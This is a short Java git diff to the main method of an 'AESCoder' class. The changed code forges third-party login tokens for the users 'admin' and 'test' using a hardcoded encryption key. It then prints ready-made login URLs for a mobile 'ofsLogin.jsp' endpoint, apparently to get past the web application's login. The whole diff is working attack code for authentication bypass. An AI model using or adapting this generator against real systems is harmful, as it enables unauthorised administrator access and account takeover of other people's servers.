@@ -79,9 +79,10 @@ public class AESCoder {
     public static void main(String[] args) throws Exception {
         String[] arr = {"admin", "test"};
 
-        for(String i : arr ){
-            String loginTokenFromThird = encrypt(i + "1", "1u6skkR"); // 生成loginTokenFromThird
-            System.out.println(loginTokenFromThird);
+        for(String receiver : arr ){
+            String loginTokenFromThird = encrypt(receiver + "1", "1u6skkR"); // 生成loginTokenFromThird
+            String path = String.format("\'%s\': /mobile/plugin/1/ofsLogin.jsp?syscode=%s&timestamp=%s&gopage=/wui/index.html&receiver=%s&loginTokenFromThird=%s", receiver, "1", "1", receiver, loginTokenFromThird);
+            System.out.println(path);
         }
     }
 }
